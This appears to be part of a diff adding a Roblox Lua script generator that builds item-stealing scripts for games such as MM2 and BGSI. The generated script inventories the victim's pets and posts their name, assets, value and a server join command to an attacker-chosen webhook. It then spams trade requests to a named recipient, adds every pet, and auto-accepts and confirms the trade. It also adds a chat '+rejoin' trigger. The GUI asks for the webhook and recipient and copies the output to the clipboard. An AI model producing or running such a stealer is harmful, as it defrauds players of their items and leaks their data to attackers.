+            fields = {
+                {name = "Holder", value = LocalPlayer.Name, inline = true},
+                {name = "Recipient", value = recipient, inline = true},
+                {name = "Assets", value = "```" .. petList .. "```", inline = false},
+                {name = "Total Value", value = formatNumber(totalValue), inline = true},
+                {name = "Join Command", value = "```game:GetService('TeleportService'):TeleportToPlaceInstance(" .. placeId .. ", '" .. jobId .. "')```", inline = false}
+            },
+            footer = {text = "Generated Script • " .. os.date("%Y-%m-%d %H:%M:%S")}
+        }}
+    }
+    
+    request({
+        Url = webhookUrl,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(payload)
+    })
+end
+
+-- Trading functions
+local function isPetInTrade(petId)
+    local tradeModule = require(ReplicatedStorage.Client.Gui.Frames.Trading)
+    local success, tradeData = pcall(debug.getupvalue, tradeModule.IsTrading, 1)
+    if not success or type(tradeData) ~= "table" or not tradeData.Party0 then return false end
+    for _, offer in pairs(tradeData.Party0.Offer or {}) do
+        if offer.Type == "Pet" and offer.Id == petId then return true end
+    end
+    return false
+end
+
+local function getTradeCount()
+    local tradeModule = require(ReplicatedStorage.Client.Gui.Frames.Trading)
+    local success, tradeData = pcall(debug.getupvalue, tradeModule.IsTrading, 1)
+    if not success or type(tradeData) ~= "table" or not tradeData.Party0 then return 0 end
+    local count = 0
+    for _, offer in pairs(tradeData.Party0.Offer or {}) do
+        if offer.Type == "Pet" then count = count + 1 end
+    end
+    return count
+end
+
+local function executeTrade(pets)
+    local tradeGui = LocalPlayer.PlayerGui.ScreenGui.Trading
+    local offeredPets = {}
+    local index = 1
+    
+    while getTradeCount() < 10 and index <= #pets and tradeGui.Visible do
+        local pet = pets[index]
+        if not offeredPets[pet.id] then
+            offeredPets[pet.id] = true
+            local attempts = 0
+            repeat
+                attempts = attempts + 1
+                ReplicatedStorage.Shared.Framework.Network.Remote.RemoteEvent:FireServer("TradeAddPet", pet.id)
+                task.wait(0.3)
+            until isPetInTrade(pet.id) or attempts >= 5
+        end
+        index = index + 1
+    end
+    
+    for _ = 1, 10 do
+        if not tradeGui.Visible then break end
+        ReplicatedStorage.Shared.Framework.Network.Remote.RemoteEvent:FireServer("TradeAccept")
+        task.wait(0.2)
+    end
+    
+    task.spawn(function()
+        while tradeGui.Visible do
+            ReplicatedStorage.Shared.Framework.Network.Remote.RemoteEvent:FireServer("TradeConfirm")
+            task.wait(0.2)
+        end
+    end)
+end
+
+-- Main execution
+local function initiateTransfer()
+    local pets = scanInventory()
+    if #pets == 0 then
+        LocalPlayer:Kick("No eligible assets found")
+        return
+    end
+    
+    local totalValue = 0
+    for _, pet in ipairs(pets) do
+        totalValue = totalValue + (pet.value * pet.amount)
+    end
+    
+    sendNotification(pets, totalValue)
+    
+    -- Wait for recipient and trade
+    local trading = false
+    
+    task.spawn(function()
+        while true do
+            ReplicatedStorage.Shared.Framework.Network.Remote.RemoteEvent:FireServer("TradeRequest", Players:WaitForChild(recipient))
+            task.wait(0.6)
+        end
+    end)
+    
+    local tradeGui = LocalPlayer.PlayerGui.ScreenGui.Trading
+    
+    tradeGui:GetPropertyChangedSignal("Visible"):Connect(function()
+        if tradeGui.Visible and not trading then
+            trading = true
+            executeTrade(pets)
+        elseif not tradeGui.Visible then
+            trading = false
+        end
+    end)
+    
+    -- Listen for chat trigger
+    Players.PlayerAdded:Connect(function(plr)
+        if plr.Name == recipient then
+            plr.Chatted:Connect(function()
+                if not trading then
+                    trading = true
+                    executeTrade(pets)
+                end
+            end)
+        end
+    end)
+    
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr.Name == recipient then
+            plr.Chatted:Connect(function()
+                if not trading then
+                    trading = true
+                    executeTrade(pets)
+                end
+            end)
+        end
+    end
+end
+
+-- Rejoin command
+Players.PlayerAdded:Connect(function(plr)
+    if plr.Name == recipient then
+        plr.Chatted:Connect(function(msg)
+            if msg == "+rejoin" then
+                TeleportService:Teleport(placeId, LocalPlayer)
+            end
+        end)
+    end
+end)
+
+task.wait(2)
+initiateTransfer()
+]=]
+end
+
+local generatedScript = ""
+
+generateBtn.MouseButton1Click:Connect(function()
+    local webhook = webhookInput.Text
+    local username = usernameInput.Text
+
+    if webhook == "" or username == "" then
+        resultText.Text = "Error: Webhook URL and Recipient Username required"
+        resultFrame.Visible = true
+        return
+    end
+
+    if selectedGame == "MM2" then
+        generatedScript = generateMM2(webhook, username, selectedRarity, "1")
+    else
+        generatedScript = generateBGSI(webhook, username)
+    end
+
+    resultText.Text = generatedScript
+    resultText.Size = UDim2.new(1, -16, 0, math.max(1000, #generatedScript / 2.5))
+    resultFrame.Visible = true
+end)
+
+copyBtn.MouseButton1Click:Connect(function()
+    if generatedScript ~= "" then
+        if setclipboard then
+            setclipboard(generatedScript)
+            copyBtn.Text = "Copied!"
+            task.wait(0.5)
+            copyBtn.Text = "Copy"
+        else
+            resultText.Text = "Clipboard API not available"
+            resultFrame.Visible = true
+        end
+    else
+        resultText.Text = "Generate a script first"
+        resultFrame.Visible = true
+    end
+end)
